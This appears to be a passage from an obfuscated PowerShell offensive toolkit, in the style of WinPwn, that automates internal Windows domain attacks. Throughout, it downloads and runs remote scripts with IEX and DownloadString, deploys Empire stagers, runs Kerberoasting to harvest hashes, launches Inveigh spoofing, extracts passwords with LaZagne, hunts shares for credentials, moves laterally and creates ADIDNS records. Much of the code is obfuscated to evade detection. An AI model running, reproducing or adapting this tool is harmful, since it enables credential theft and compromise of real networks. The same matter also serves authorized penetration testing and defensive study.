    IEX (  New-Object NET.WEBcLiEnT )."dowNLo`A`D`sTRinG"(  (  'http' +'s:'+ '//raw.githubu' + 'sercon'+ 'tent.c'+  'o'  +'m/Secur'  +  'eThisS'+  'h'  + 'i' + 't'  + '/'+  'Cr'  + 'e'+'ds/m' + 'aste' +  'r/o' + 'bfuscated'+ 'ps/' +'w' +'micmd'+'.ps1'))
    if (Test-Path $CUrreNtPath\EXPlOitaTION\lOcALADmiNaCcesS.txt  )
    {
        ${E`XPLo`IthO`StS}  =  Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"
    }
    else
    {
        ${fi`lE}   =  "$currentPath\Exploitation\Exploited_Empire.txt"
        While(  ${I} -ne (  'qui' +'t')) 
        {
	        If ( ${i} -ne ${n`ULl}) 
            {
		        ${I}."t`Rim"()   |   Out-File ${fI`le} -append
	        }
	        ${i}  = Read-Host -Prompt ('P'  +'le' + 'a'+'se'  +' p'  +  'rov' +  'ide'  +' o' +'ne'  +' or m' +'or' +'e' + ' IP-Adre' +  'ss as'+ ' target:' )    
        }

    }

    ${STAgER`F`iLe}   =  "$currentPath\Exploitation\Empire_Stager.txt"
    While(  ${PAY`L`OaD} -ne ( 'qu' +'it' )  ) 
    {
	    If (${PA`y`lOAd} -ne ${n`ULL}) 
        {
	        ${pAY`l`OAD}."Tr`im"(  )   | Out-File ${ST`AG`Er`FiLe} -append
	    }
        ${pAyl`OaD}  = Read-Host -Prompt (  ( 'Ple' +'ase pro' +'vide the po'+'wershell'+  ' Empi'  +  're '  +'S' +  'tager payloa'+ 'd (beginning with'+  ' 91'  + 'Upow'  +'ersh' +  'e'  + 'll -'  + 'no'  + 'P -sta -w'+' 1 -enc  B'  +'A' + 'SE64Code91U) :') -REpLacE'91U',[ChAR]34 )
    }
    
    ${e`XECUTI`O`Nw`ith}  = Read-Host -Prompt (  'U'  +  'se'  +' '+  'the current Us' + 'e'+ 'r' + ' ' +  'for Pa' + 'y'+  'load E'+'x'  +  'ec'+  'ution? (yes/'+  'no' +'):')

    if ( Test-Path $cUrRenTpAtH\exploitAtiON\exPloitED_EMPIRe.TXT  )
    {
        ${hoS`Ts} = Get-Content "$currentPath\Exploitation\Exploited_Empire.txt"
    }
    else {${hoS`Ts} =   Get-Content "$currentPath\Exploitation\LocalAdminAccess.txt"}

    if (${ex`ec`U`TIOnWItH} -eq (  'y' +'es') -or ${e`xEcUti`ONWiTh} -eq "y" -or ${Ex`e`C`UtiO`NwITh} -eq (  'Y'+ 'es') -or ${exe`CutIoN`WIth} -eq "Y"  )
    {
        ${H`OS`Ts} | bootblacks -OnVxcvnOYdGIHyL ${P`AyL`OaD}
    }
    else 
    {
        ${crE`dEn`TI`AL}   = Get-Credential
        ${HO`S`Ts}   | bootblacks -OnVxcvnOYdGIHyL ${pa`yL`OAD} -bOo9UijDlqABKpS ${CReD`e`NTial}
    }
}

function ShAREEnumERAtION
{
    
    
    ${c`Ur`REnT`paTh}   =  (Get-Item -Path ( (  '.'+ 'hbl'  )."REp`LaCe"(  'hbl',[StriNg][CHaR]92) ) -Verbose )."F`Ullna`ME"
    pathcheck
    IEX (New-Object Net.wEbclieNt )."d`O`WNloa`d`sTrinG"(  ( 'https:/'  +  '/raw.githubuse' +  'r'  +'con'+'t'  +'e'  +  'nt.com/Secu' +'reT' + 'h'  +'isS'  +  'hit'  +  '/C'+ 'r'+ 'eds'  + '/ma'  + 'ste'  +  'r'  + '/'  + 'obfuscate'+ 'd'  +  'ps' +'/view' + '.ps1' ))
    Write-Host -ForegroundColor YelLow (  'Se'+  'archin'  +'g' + ' for se'+ 'ns'+  'itive'  + ' F'  + 'ile'  + 's on '+ 'the Domain-Netw'+  'ork,' + ' this c' + 'a' +  'n take a while:' )
    Claire >> $cURrenTpatH\sEnsITIVeFiLES.txT
    shift -qgsNZggitoinaTA >> $cuRrEnTpAtH\nEtwoRkShArES.TXt
}

function gRouPSeaRCh
{
    
    
    ${c`URReN`TPA`Th}  = ( Get-Item -Path (('.' +  't7V'  )  -CREpLAcE  (  [chaR]116 +[chaR]55 + [chaR]86),[chaR]92) -Verbose  )."fuL`L`NamE"
    pathcheck
    iex (new-object nET.webclIENt)."DoWNLOAD`sTR`INg"((  'h' +  't' +  'tps'  + ':/' + '/raw.' +  'git'  +  'hubuse'+  'rc'  + 'o' +'n'+  'tent.co'+  'm/Sec'  +  'ur'  + 'eTh'+ 'isSh' +  'it/Creds' + '/'+'master/' +  'ob' +'fu' + 's'+ 'catedps/vi'+'ewde'  +  'vob'  +  'fs.p'+'s'+  '1')  )
    ${U`Ser}   = Read-Host -Prompt (  'D' +'o you wa'+  'nt '  +  'to search for other ' +'u'  +'sers' + ' than the se'  +'ssion-' + 'us' +  'er?'+' (yes/no)')
            if (  ${Us`eR} -eq ( 'ye' +'s') -or ${us`eR} -eq "y" -or ${uS`eR} -eq ('Ye'+'s'  ) -or ${u`sEr} -eq "Y")
            {
                Write-Host -ForegroundColor yElLow ( 'Please enter a use'  + 'r' +'n'  +  'ame to '  + 'search fo'+'r'  +':'  )
                ${Us`eRNa`mE}  = Get-Credential
                ${g`ROUp} =  Read-Host -Prompt (  'Pleas' +  'e en' + 't'+'er' +' a '+ 'G' +'r'+'oup-N'  +'ame to sea'+  'rc'+'h ' +'fo'  + 'r: (A'+  'dministr' + 'ators,RDP'  +  ')'  )
                Write-Host -ForegroundColor YELLoW ('Se' +  'archin'  +  'g...'  + ':')
                rewires -LocalGroup ${Gr`O`UP} -Credential ${UsErNa`mE} >> $cuRRENtpatH\GroUpSearCHES.tXT
            }
            else
            {
                ${grO`UP} =   Read-Host -Prompt ('P' +  'l'+ 'e'  + 'ase ent' +  'e'+  'r' +' a Group-N' + 'am' +  'e to '+'sear'+'ch for: (Adm'+  'inistrators,R'  +'D'  +  'P)' )
                Write-Host -ForegroundColor YEllOW ( 'Sear'+ 'ch'  +'ing...:'  )
                rewires -LocalGroup ${GrO`UP} -Identity ${ENv`:US`e`RnAme} >> $CuRRenTpaTh\grOuPsearCheS.tXT
                Write-Host -ForegroundColor YELlOw ('S' +  'ys' +'tems ' + 'sav'  + 'ed '+ 'to' +' '+  '>' +  '> ' +( '{0}curr' +'entP'  +  'ath{'+'1}Groupsearch'+ 'es.txt'+  ':' )  -f[cHAR]36,[cHAR]92  )
            }
}

function PROXYdEtect
{
        
    
    ${cu`RR`ENtpa`TH}  =  ( Get-Item -Path ( (  '.6Pe'  )-CRepLACE '6Pe',[ChAr]92  ) -Verbose)."f`ULLNA`mE"
    pathcheck
    Write-Host -ForegroundColor yEllow ( 'Sear'+'chi' + 'n' + 'g for networ'+'k'+ ' pr' +'oxy.' + '..')

    ${r`Eg2} =    $O51et::"OPenRem`OteB`A`se`keY"( (  'Cur' + 'rentUse' + 'r'  ), ${En`V:`COmP`U`TER`NamE})
    ${R`Egkey2}  = ${re`G2}."OpEn`SUbk`ey"(( ('SO'  + 'FTWARE' +'v8'  +'U'  +  'v8'+ 'U'  +'Microso' + 'ft'  +'v'+  '8Uv8UWindowsv8' + 'Uv'+  '8UC'  +'u' +'rr'+ 'entVe'  +'rsionv8Uv' +'8UI'  + 'n'  + 'te'+  'rnet ' + 'Set'+'ting'  +  's')."r`EP`LaCE"( 'v8U','\' )  ))

    if (${R`eGkey2}."GETV`A`Lue"(('P'  +'r'  + 'oxySe' +  'rver'  )  ) -and ${r`eg`Key2}."G`etvaLue"(( 'P'  + 'rox' +'yEnabl'  +  'e')  ))
    {
        ${pR`oXY}   =  Read-Host -Prompt ('Proxy'  + ' detect'+'ed! ' + 'Pr'  +  'oxy is: ' )${R`egk`eY2}."g`E`TVaLUE"( ('P'+  'r' +  'oxySe'+  'rver'  ) )( '! Does the P'+ 'owershe' +'ll-'  +'Use' +'r have pro' +  'xy rig'+'hts' +'? ('  +'ye' +  's/no)')
        if ( ${p`ROXy} -eq ('y' +'es' ) -or ${P`ROxy} -eq "y" -or ${p`RoxY} -eq ( 'Ye'  + 's'  ) -or ${pR`O`Xy} -eq "Y" )
        {
             
            Write-Host -ForegroundColor yEllOW (  'Settin'+ 'g'+' up Po' +'wershell' +'-S'+  'ession Proxy C'  + 'red'  +'entials' + '...'  )
            ${W`cL}  = new-object SYsTEm.NeT.WEbcliEnt
            ${W`cL}."pR`OxY"."Cr`e`DEntI`AlS"  =  (   VaRiaBle (  "b"+"UE8t")  -VA    )::"deFaUlt`NE`TwOrKcR`Eden`TIa`lS"
        }
        else
        {
            Write-Host -ForegroundColor yeLLOw (  'Please'  +' e'  + 'n'  + 'ter'  + ' va'  +'lid creden'  +  'tials, or the '+  'sc' +  'ript'  +' will f'+ 'ail'  +  '!' )
            
            ${webc`LI`ENt}=  New-Object sySTem.nET.WEbClIENt
            ${c`Re`dS}=Get-Credential
            ${wEBc`Li`ENt}."Pr`oXy"."cRedEn`T`ials" =  ${cRE`dS}
        }
   }
    else {Write-Host -ForegroundColor yEllOw ('No pro'+  'xy'+ ' det'  +  'ected, ' + 'c'+'ontin'  + 'uing... '  )}
}

function kERBeROAstING
{
    
    ${curR`ENT`PATh}   = (  Get-Item -Path ((  '.{0}'  )-F[chaR]92  ) -Verbose  )."FU`L`lNamE"
    pathcheck
    Write-Host -ForegroundColor YEllOw (  'Star'+  'ting Exploi' +'ta'+ 'tion P' +  'hase:')
    Write-Host -ForegroundColor reD ( 'Ke'  +'rbero'  + 'ast'+ 'ing active:'  )
    invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'');Invoke-Kerberoast -OutputFormat Hashcat | fl >> .\Exploitation\Kerberoasting.txt;Write-Host -ForegroundColor Yellow ''Module finished, Hashes saved to .\Exploitation\Kerberoasting.txt:'' ;pause}'
}

Function gET-instAlleDSoFTwARe {
    [CmdletBinding(  sUpPORTsShoUldpROcesS  =${t`RUe} )]
    param(  
        [Parameter(  VaLUefROMpiPelInE              = ${T`RUe},
                   vaLUefROmPipelinEbyproPERtYname =  ${T`RUe},
                   POSitIoN= 0
        )]
        [string[]]
            ${cOMpU`T`ERNA`me}   = ${Env`:Co`Mp`U`TeRnA`me},
        [Parameter(POsITIOn  =  0 )]
        [string[]]
            ${pRO`p`ertY},
        [string[]]
            ${IN`c`LUDE`PrOgRam},
        [string[]]
            ${eXC`lU`dEprOGRAM},
        [switch]
            ${ProGRaM`R`E`gExMATcH},
        [switch]
            ${lASta`cC`ESS`T`iMe},
        [switch]
            ${ExC`LUdE`SimiL`Ar},
        [int]
            ${s`iMi`larwo`Rd}
    )

    begin {
        ${R`EgisT`RylocAti`oN}   =   ( (  'SOFTWA'  +  'RE'+ 'SwAMi'+ 'croso'  +'ftSwAWi'+'n'+'dow'+'sSwACurrentVersionSwA'  + 'U' +  'n'  +'in' +'stal'  + 'lSwA' )."REpL`A`cE"( ([ChAR]83+[ChAR]119+[ChAR]65  ),[StrIng][ChAR]92)  ),
                            (( 'S'  + 'OFTWAREAIuWow6432' +'NodeAIuMic' + 'rosoft' + 'AI'+'u'+'W'+ 'i'  +  'ndowsAIuC' + 'urrent' +'Ve'+  'rsionAIu'+  'Unins'+  'tallAIu'  )."rE`p`lAcE"(( [ChAR]65  +[ChAR]73 +[ChAR]117),'\'))

        if (${PsVE`R`SiontAbLE}."P`S`V`eRSION"."Maj`or" -gt 2 ) {
            ${HA`ShPr`OpErTY}   =   [ordered]@{}    
        } else {
            ${h`Ash`P`RoP`erTy}   =  @{}
            ${se`LEctPr`OP`e`RTY}  =  @((  'Compute'  + 'rN' + 'am' + 'e' ),( 'Progra'+'m' +'Name'))
            if (${pro`P`ERty} ) {
                ${sEle`C`TP`ROP`eRtY} += ${Pr`o`PERtY}
            }
            if (${lA`S`TacceSs`TIme} ) {
                ${SEL`ecTP`R`OPERty} += ('Las' + 'tAcce' +  'ss'+  'Tim' + 'e'  )
            }
        }
    }

    process {
        foreach (  ${COmP`U`TeR} in ${c`OMPuT`Er`Name} ) {
            try {
                ${sO`cK`et}   = New-Object nEt.soCKETS.TCPcLiEnt(${CoM`PuTER}, 445)
                if (  ${sO`cKet}."con`NE`ct`ed") {
                    ${r`E`GBAsE} =   $o51ET::"OPENremO`TEb`ASe`KEY"( (    Gi ('V'  + 'a'+'RiA' + 'blE:fS'+ 'mT' )    ).VALue::"Lo`c`ALm`AChINe",${com`pU`Ter} )
                    ${ReG`istR`yloCa`T`ion} |   ForEach-Object {
                        ${CuRRe`NT`Reg}   =  ${_}
                        if (  ${rE`gBa`se}  ) {
                            ${CU`RRenT`R`EGkeY} =   ${rE`gb`Ase}."oPE`NS`UbkeY"(${C`URREn`TReG} )
                            if (  ${C`URr`entreGkey}  ) {
                                ${cURREnt`Re`GkeY}."GetsubkE`y`NA`MES"( ) | ForEach-Object {
                                    ${hashpR`oPE`RTY}."cOm`Put`ErNAmE"   =   ${C`OM`PUteR}
                                    ${hashP`ROp`ERty}."pR`oG`RamNaME"  =   ( ${D`isPlAy`Na`ME}  =   (${re`g`BAsE}."OPEn`sUbk`eY"( "$CurrentReg$_"  ) )."GetV`AL`Ue"(  ('D'+  'isplayN'  +'ame'  ) ))
                                    
                                    if (  ${iNcLuD`e`ProG`RaM}) {
                                        if (${pRo`GrAmrEG`e`XmATCh}  ) {
                                            ${IncL`Ud`E`PRoG`RAM} | ForEach-Object {
                                                if ( ${dI`S`PlAY`NamE} -notmatch ${_}  ) {
                                                    ${DI`sPlaY`Na`ME} =   ${n`ULL}
                                                }
                                            }
                                        } else {
                                            ${i`Nc`L`UdeprOgraM} |  ForEach-Object {
                                                if (  ${DISp`L`AYn`AmE} -notlike ${_}) {
                                                    ${diSPLAY`N`Ame} = ${N`Ull}
                                                }
                                            }
                                        }
                                    }

                                    if (  ${exCL`UDePROGR`Am}  ) {
                                        if (  ${P`RO`gram`REG`exmatcH} ) {
                                            ${exCl`UdeprOGR`AM} |   ForEach-Object {
                                                if (  ${DiS`plAYNa`ME} -match ${_}  ) {
                                                    ${Di`Spla`yn`AME}  =   ${Nu`ll}
                                                }
                                            }
                                        } else {
                                            ${eX`c`lUd`EPRogR`AM}   | ForEach-Object {
                                                if (${di`sP`LAyN`AMe} -like ${_}) {
                                                    ${disP`layn`Ame}   =  ${Nu`LL}
                                                }
                                            }
                                        }
                                    }

                                    if ( ${DIsP`LA`YNA`mE} ) {
                                        if ( ${P`RoP`ErTy}  ) {
                                            foreach (  ${CU`RREnTp`R`O`PERTy} in ${pro`pEr`Ty}  ) {
                                                ${haSH`P`R`op`erTY}.${cuR`R`ENtPr`OPEr`Ty} =  (${RE`GB`ASe}."O`Pe`NsUBKEY"("$CurrentReg$_"  )  )."G`eTVAl`Ue"( ${CURRe`NTp`Rop`E`R`Ty})
                                            }
                                        }
                                        if (  ${lA`sT`AcCes`sTIME}) {
                                            ${iN`stalL`p`AtH} =   (${rE`gb`ASe}."OPe`N`SubkEy"("$CurrentReg$_")  )."gET`VA`lue"(('In'  +  'st'  +  'a'+'llLoc'+'ation')) -replace ( (  'KxyK'  +  'x' +  'ybEK'  )."r`epLAce"( 'bEK','$'  )."REP`L`ACe"(  'Kxy',[STrInG][chaR]92 )),''
                                            if (  ${iNsT`ALlp`ATH} ) {
                                                ${wmI`SP`Lat} =  @{
                                                    "coMputE`RnA`me"   =   ${cOmp`U`TeR}
                                                    "Q`UeRy"          =   $("ASSOCIATORS OF {Win32_Directory.Name='$InstallPath'} Where ResultClass = CIM_DataFile")
                                                    "error`Ac`TiOn"  = (  'S' +'il'+  'en' +  'tlyCon' + 'tinue'  )
                                                }
                                                ${Ha`ShpRo`Per`TY}."lastAc`c`es`sTiME"   =  Get-WmiObject @WmiSplat   | 
                                                    Where-Object {${_}."Ext`e`NSi`ON" -eq ( 'ex'  + 'e') -and ${_}."la`sT`ACcESs`ED"} |
                                                    Sort-Object -Property LAsTAcCesSEd |
                                                    Select-Object -Last 1   | ForEach-Object {
                                                        ${_}."conVe`RT`T`odaTetIME"(${_}."laST`Acc`eS`SED")
                                                    }
                                            } else {
                                                ${H`AshProPE`R`TY}."Las`TaCCE`SS`TImE" =  ${Nu`LL}
                                            }
                                        }
                                        
                                        if ( ${PSvE`R`SioNTA`BLe}."p`sv`Ers`Ion"."M`Ajor" -gt 2 ) {
                                            [pscustomobject]${HAshpR`ope`R`Ty}
                                        } else {
                                            New-Object -TypeName pscusToMobJeCT -Property ${HasHpro`Pe`Rty}  |
                                            Select-Object -Property ${SElEc`T`PROPErTy}
                                        }
                                    }
                                    ${S`Oc`kET}."c`losE"()
                                }

                            }

                        }

                    }
                }
            } catch {
                Write-Error ${_}
            }
        }
    }
}

function wiNpWN
{
    

    if (isadmin  )
    {
        Write-Host -ForegroundColor GREen ( 'El'+'ev' +'ated PowerShell' +  ' ses'  +  'sion'+  ' '  +'det'+'ected. ' +  'Co' + 'ntinuing.')
    }
    else
    {
        Write-Host -ForegroundColor reD ( 'O'+'n' +  'l'+ 'y r'+ 'u'  + 'nning non-elevated P' +'o' +'w' + 'er'+ 'Shell commands. '+ 'Ple'  +  'ase '  +  'launch a'  +'n e'  +  'levated session '  + 'if'  +  ' y'  +'ou hav' + 'e local Ad'  +'mini' +'strator Credentia'+  'ls' +  ' '+'and try '  +  'agai' +  'n' +'.' )
    }
    Write-Host -ForegroundColor yELLOW ('Getting Scrip'+  'ts' + ' to M'  + 'e' +'mory'  )
    
    dependencychecks        
  
    
    
    ${I`NvEI`gH}  =   Read-Host -Prompt (  'Do y' +'o'+'u ' +  'wan'+'t'+' to'+ ' use' +  ' '  + 'in'  +  'veigh '  +'for'  +' NBN'  +'S/S' + 'MB'+  '/HTTPS'  +  ' S'  +  'poo' + 'fing par' + 'alle'+'l t'  +'o th' +'is'+ ' '+ 'sc' + 'ri'  +'pt? (yes/'  +'no)')
    if (  ${INvE`IGH} -eq ( 'ye'  + 's' ) -or ${i`N`VEIgh} -eq "y" -or ${i`NVEI`GH} -eq ( 'Y'+'es' ) -or ${I`NVE`IGh} -eq "Y"  )
    {
        Inveigh
    }        
    
 
    
    ${LOc`ALRE`C`On}  =   Read-Host -Prompt ('Do'+ ' yo'+'u want t' +'o u' +  'se ' + 'lo'+ 'cal ' +'recon ' +  's' +'cripts? (yes' +'/no)')
    if (${L`oCA`lRecoN} -eq ('ye'+  's'  ) -or ${lOC`Al`Re`COn} -eq "y" -or ${L`oC`ALr`econ} -eq ('Ye' +  's' ) -or ${L`oc`Al`REcON} -eq "Y"  )
    {
        
        localreconmodules
    }
    
    ${DomAi`N`R`ECOn}  =  Read-Host -Prompt ('Do yo'  +'u want t'+  'o u'  +  'se do'  +  'm'  + 'a' +'in recon scripts? ('  +'yes'+'/'  +'n'+ 'o)')
    if ( ${d`oMai`Nrec`oN} -eq ( 'ye' + 's' ) -or ${dOm`AINR`econ} -eq "y" -or ${doMaI`NR`ECoN} -eq ('Y'  + 'es') -or ${dOmA`iN`ReC`on} -eq "Y" )
    {
        domainreconmodules
    }
    
    ${P`Ri`VeSC}   =  Read-Host -Prompt (  'Do y'  + 'ou wa'  +  'n'+ 't to'+' '  +  'searc' + 'h for possible pr'+'ivilege ' + 'escalat'  + 'i'  +'on'+ ' vectors? (' + 'y' + 'es/' + 'no)' )
    if (  ${p`RivE`sC} -eq ( 'ye'  +  's' ) -or ${prI`VE`SC} -eq "y" -or ${P`RIVE`Sc} -eq ( 'Ye' + 's' ) -or ${PrIve`sc} -eq "Y"  )
    {
        privescmodules
    }
    
    
    ${lAz`AGne} = Read-Host -Prompt (  'Do you' + ' wan' +  't ' +  'to' +  ' extra'  + 'c' + 't loca'  +'l Pa'+'sswor'  + 'd'  +'s w'  +  'it' + 'h Lazagne'+ '? '+'(ye'  + 's/n'  +'o' +')' )
    if (  ${lAzA`GNE} -eq ('y'+  'es' ) -or ${lAZ`AgNE} -eq "y" -or ${LaZ`A`gnE} -eq ( 'Ye'  +  's' ) -or ${LAZ`Ag`Ne} -eq "Y"  )
    {
        lazagnemodule 
    }
    
    ${K`ER`BER`OAsT`Ing}   =   Read-Host -Prompt ( 'Do you'  + ' want to use Kerb' +  'eroas'+ 't'  + 'ing' + ' techniq'  + 'u' + 'e'+ ' to'  +  ' c'+'rack '+  'fu' + 'nc'+ 't'+  'i'  + 'o'+ 'n '+  'u'  +'ser Hashe'  + 's? ' +'(yes/n'+'o' +  ')'  )
    if (${KE`RB`Eroa`ST`Ing} -eq ( 'y' +'es') -or ${kE`R`BeROAS`T`Ing} -eq "y" -or ${Kerb`eROas`T`InG} -eq ( 'Ye'  +  's') -or ${k`eRBER`oasT`inG} -eq "Y" )
    {
        kerberoasting
    }


    
    
    ${l`AtM`OV} =   Read-Host -Prompt ( 'Do y'  + 'ou want' +  ' to m'  +'o' +'ve la'  +  'teral'+  'ly - re'+  'comme'  +'nded for intern'+ 'al ' +'as'+ 'sesme' +'n'+'ts?'+  ' (' + 'ye'  +  's/no)')
    if (${Lat`M`oV} -eq ( 'ye'+'s') -or ${l`ATMOv} -eq "y" -or ${LaT`mov} -eq ('Ye'+  's'  ) -or ${laTm`ov} -eq "Y"  )
    {
        
        latmov
    }
    
    
    ${F`Ruit}  = Read-Host -Prompt ('Do'+  ' you want '+ 't'  +  'o search' +' f'+  'or ' + 'poss'+'ible '+'weak'+  ' Web Appli'+'ca'  +  'tion'  +  's in '+  'the ne'+'tw'+  'or'+'k? (yes/no)')
    if (${F`RuiT} -eq ( 'ye' +  's') -or ${f`RU`It} -eq "y" -or ${Fr`U`iT} -eq (  'Ye'+ 's') -or ${fR`U`it} -eq "Y" )
    {
        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Find-Fruit.ps1'');$network = Read-Host -Prompt ''Please enter the CIDR for the network: (example:192.168.0.0/24)'';Write-Host -ForegroundColor Yellow ''Searching...'';Find-Fruit -FoundOnly -Rhosts $network}'
    }
    
    
    ${sh`Ar`es}  =  Read-Host -Prompt ( 'Do you '+  'want' +' to sea' + 'rc'  + 'h'+ ' f'  + 'or' +' sen'  + 's'+  'i' + 'tive Fi'  + 'les / Find S'  +'hare'+  's on' + ' '+'the net' + 'work? (y' +'es/no)'  +' (Th'  + 'is '  +  'may take long ' + 't'+ 'ime'+ ')')
    if ( ${s`ha`Res} -eq ('ye' + 's' ) -or ${SHAr`Es} -eq "y" -or ${s`h`AReS} -eq ('Ye'  + 's'  ) -or ${s`harEs} -eq "Y"  )
    {
        sharenumeration
    }
    
    ${A`dI} = Read-Host -Prompt ('Do you '  +  'wa'+ 'nt' +' to cr' +  'eate'+  ' a '  +'A' +'DID' +  'NS Wildcard'+ ' record'+  '? (yes/no)')
    if (${A`di} -eq ( 'y'+'es') -or ${a`DI} -eq "y" -or ${a`DI} -eq ( 'Ye'  + 's'  ) -or ${a`di} -eq "Y"  )
    {
        adidns
    }
    
    
    ${R`Dp}   =   Read-Host -Prompt (  'D' +'o you '  +  'w' + 'an' + 't t'  +'o' + ' searc' +  'h for'+' Sys'  + 'tems you hav' +'e' + ' RDP/'+ 'Ad'  +'min-Acce'  +'ss '  + 'to? (y'  + 'e' +  's/no'+')'  )
    If (  ${r`DP} -eq ( 'y' +'es') -or ${r`DP} -eq "y" -or ${R`Dp} -eq ( 'Ye'  + 's' ) -or ${R`dP} -eq "Y")
    {
       groupsearch
    }
    
    
    Write-Host -ForegroundColor YelloW (  'Di'+'dnt'+  ' get'  + ' ' + 'Doma' +  'dm? Che' + 'ck the '+  'foun'+'d F'+ 'iles/'  +'Sh'+'ares for'  +' sensitive' + ' Dat' +'a'+ '/'+  'Cred' + 'entials. ' +'Check'  +  ' the Pr'  +  'o' +'perty '  +  'field '  +'of AD-User'+  's f'+'or Passwords. ' +'Network '+ 'S' + 'hares an'+'d Passwor' +  'ds'  + ' in them ca'+'n' + ' ' + 'l' +'ead to success! '+ 'Try '  + 'R' +  'espond' +'e'  + 'r/I'+ 'nveigh and '+ 'SMB-'+'R'+  'e'+  'l'+ 'ayin'+  'g! ' +  'ADIDNS is a good additi' +'o'+  'n f' +  'o' +'r ' +'the who'+  'le network. Cr' +  'ack Kerb'+'eroas'  + 'tin'+'g '+ 'Ha' + 's'  +  'hes.')
    
}

